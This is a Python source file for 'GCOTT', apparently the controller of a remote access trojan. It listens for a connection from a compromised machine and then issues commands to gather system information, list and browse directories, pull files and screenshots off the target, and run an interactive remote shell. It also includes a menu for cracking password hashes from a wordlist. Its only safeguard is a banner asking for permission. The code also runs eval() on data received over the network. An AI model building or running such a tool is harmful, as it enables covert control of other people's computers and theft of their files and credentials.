import socket,json,base64,time,subprocess,pickle,gzip
import os
from termcolor import colored
from art import *
from password import Password_Cracker

def listen(ip,port):
    global target_ip,target_port
    target_connection_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target_connection_.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    target_connection_.bind((ip,port))
    target_connection_.listen()
    print("Listening...")
    target_,target_adress = target_connection_.accept()
    target_ip,target_port = target_adress
    print(target_ip,target_port)
    return target_,target_connection_
def recive():
    return target.recv(1024).decode()
def clear():
    subprocess.call('cmd.exe /c cls')
def help():
    print("-h/help: Show all option that you can use\nshow: Show all settings of connection\n-g/generate: Show generating payload menu\nset [OPTION_NAME]: set the option of connection\n-l/listen: Show listening optiion\nrun/execute: execute")
def listen_help():
    print("info: get information about target\ncwd: get current directory\nls: list directory\ncd: change directory EX: cd ../ cd [directory_name]\nuser: show user pemission\nget [File_Name]: get the file from target\n")
def get_file(file_name):
    with open(file_name,"wb") as file:
        data=b''
        while(True):
            batchs=target.recv(1024)
            if batchs==b"done":
                print("done")
                break
            data+=batchs
        file.write(data)

at_sign = colored("@","green")
quit_status = 0
ss_num=0
clear()
ascii_art = text2art("GCOTT")
print(ascii_art)
print("Welcome To GCOTT\n This tool is for taking control of the target\n Please use this tool if only you have permission\n\n\nyou can see option with -help or -h\n\n")
while True:
    chapter = input("GCOTT -> ")
    if chapter == "help" or chapter ==  "-h":
        print("help")
        help()
    if chapter =="listen" or chapter ==  "-l":
        host_ip = socket.gethostbyname(socket.gethostname())
        host_port = 5555
        while True:  
            option = input("GCOTT -> ")
            if option == "show":
                print("\n--------------------------\nHost_IP: ",host_ip,"\n--------------------------\nHost_Port: ",host_port,"\n--------------------------\n")
            elif "set" in option:
                set_option = option.split(" ")[1].split("_")[1].lower()
                set_value = option.split(" ")[2]
                if set_option =="ip":
                    host_ip = set_value
                elif set_option == "port":
                    host_port = set_value
            elif option =="execute" or option =="run":
                target,target_connection = listen(host_ip,host_port)
                target_ip = colored(target_ip,"red")
                while True:
                    command = input(str(target_ip)+at_sign+"GCOTT-> ")
                    if command=="help" or command =="-h":
                        listen_help()
                    else:
                        target.send(command.encode())
                        if command =="info":
                            info = target.recv(1024).decode().split("(")[1].split(")")[0].split(",")
                            print(info[0],"\n",info[1],"\n",info[2],"\n",info[3],"\n",info[4],"\n")
                        elif command =="cwd":
                            print(target.recv(1024).decode())
                        elif "cd" in command:
                            if recive() =="0":
                                print("Permission Denied!!!!!!!!")
                        elif command =="ls":
                            try:
                                list_dir = eval(target.recv(10240).decode())   
                                for i in list_dir:
                                    print(i)
                            except:
                                print("dictionary size too big to show")
                        elif command =="user":
                            print(recive())
                        elif command.split(" ")[0] =="get": 
                            get_file(command.split("get ")[1])
                        elif command == "screenshot":
                            get_file("screenshot"+str(ss_num)+".png")
                        elif command == "shell":
                            shell_command = input(str(target_ip)+at_sign+"Shell:")
                            target.send(shell_command.encode())
                            while True:
                                if shell_command=="quit":
                                    break
                                output = target.recv(4096)
                                decompressed_data = gzip.decompress(output)
                                original_data = str(pickle.loads(decompressed_data))
                                if shell_command=="di2r":
                                    original_data=original_data.split("\\r\\n")
                                    for i in original_data:
                                        print(i)
                                else:
                                    print(original_data)
                                shell_command = input(str(target_ip)+at_sign+"Shell:")
                                target.send(shell_command.encode())
                        elif command == "q" or command == "quit":
                            target_connection.close()
                            break
    elif chapter =="password" or chapter == "-p":
        hashed_password = input("Enter the hashed password: ")
        password_list_path = input("Enter the password list path: ")
        hash_type = input("Enter the hash type: ")
        randomness = input("Enter the randomness type(0/1): ")
        cracker = Password_Cracker(hashed_password,password_list_path,hash_type,randomness)
        result = cracker.crack()
        print("Password => ",result)

#target_connection.close()